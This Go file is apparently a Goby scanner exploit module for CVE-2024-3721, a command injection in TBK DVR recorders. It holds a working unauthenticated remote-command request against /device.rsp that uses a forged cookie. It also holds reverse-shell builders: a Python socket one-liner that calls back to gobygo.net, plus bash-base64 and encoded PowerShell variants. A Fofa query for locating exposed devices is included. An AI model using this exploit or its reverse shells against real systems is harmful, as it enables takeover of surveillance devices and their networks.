package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "TBK DVR /device.rsp Command Execution Vulnerability (CVE-2024-3721)",
    "Description": "<p>DVR, full name is Digital Video (Hard Disk Video Recorder), is a set of computer system for image computing and storage processing, with the functions of long-term video, recording, remote monitoring and control of image/voice and dynamic frames. </p><p>There is a command execution vulnerability in the device.rsp interface of TBK DVR DVR, which can be exploited by an unauthenticated remote attacker to bypass cookie authentication to execute arbitrary system instructions, write backdoor files, and obtain the shell permission of the recorder.</p>",
    "Product": "TBK DVR",
    "Homepage": "https://www.hikvision.com/cn/products/Video-Recorder/Digital-hard-disk-recorder/",
    "DisclosureDate": "2024-05-09",
    "PostTime": "2024-11-05",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "banner=\"Location: /login.rsp\" && banner=\"P3P: CP\"",
    "GobyQuery": "banner=\"Location: /login.rsp\" && banner=\"P3P: CP\"",
    "Level": "2",
    "Impact": "<p>There is a command execution vulnerability in the device.rsp interface of TBK DVR DVR, which can be exploited by an unauthenticated remote attacker to bypass cookie authentication to execute arbitrary system instructions, write backdoor files, and obtain the shell permission of the recorder.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/138614912"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "TBK DVR 硬盘录像机 /device.rsp 命令执行漏洞（CVE-2024-3721）",
            "Product": "TBK DVR",
            "Description": "<p>DVR，全称为Digital Video (硬盘录像机)，是⼀套进行图像计算存储处理的计算机系统，具有对图像/语音和动态帧等进行长时间录像、录音、远程监视和控制的功能。<br></p><p>TBK DVR硬盘录像机 device.rsp 接口处存在命令执行漏洞，未经身份验证的远程攻击者可以利用此漏洞绕过cookie认证执行任意系统指令，写入后门文件，获取录像机shell权限。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>TBK DVR硬盘录像机 device.rsp 接口处存在命令执行漏洞，未经身份验证的远程攻击者可以利用此漏洞绕过cookie认证执行任意系统指令，写入后门文件，获取录像机shell权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TBK DVR /device.rsp Command Execution Vulnerability (CVE-2024-3721)",
            "Product": "TBK DVR",
            "Description": "<p>DVR, full name is Digital Video (Hard Disk Video Recorder), is a set of computer system for image computing and storage processing, with the functions of long-term video, recording, remote monitoring and control of image/voice and dynamic frames.&nbsp;</p><p>There is a command execution vulnerability in the device.rsp interface of TBK DVR DVR, which can be exploited by an unauthenticated remote attacker to bypass cookie authentication to execute arbitrary system instructions, write backdoor files, and obtain the shell permission of the recorder.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a command execution vulnerability in the device.rsp interface of TBK DVR DVR, which can be exploited by an unauthenticated remote attacker to bypass cookie authentication to execute arbitrary system instructions, write backdoor files, and obtain the shell permission of the recorder.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setPayloadRequestHash_kjfbahncjnbsyayhxbyeggbavgebdjuushyrfhbchbcnjasufugrtbhde := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL := "/device.rsp"
		//
		command = `echo;echo 'start';` + command + `;echo 'end';`
		command = url.QueryEscape(command)
		requestConfig := httpclient.NewGetRequestConfig(vulURL + "?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=" + command)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
		requestConfig.Header.Store("Cookie", "uid=1")
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			return "", vulURL, err
		}
		commandResult := ""
		//正则匹配
		re, err := regexp.Compile(`start((.|\n)*?)end`)
		//检查是否有匹配到内容
		if !re.MatchString(resp.RawBody) {
			return "", vulURL, errors.New("failed to RCE")
		}
		match := re.FindStringSubmatch(resp.RawBody)
		commandResult = match[1]
		return commandResult, vulURL, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_kjfbahncjnbsyayhxbyeggbavgebdjuushyrfhbchbcnjasufugrtbhde

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_kjfbahncjnbsyayhxbyeggbavgebdjuushyrfhbchbcnjasufugrtbhde

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
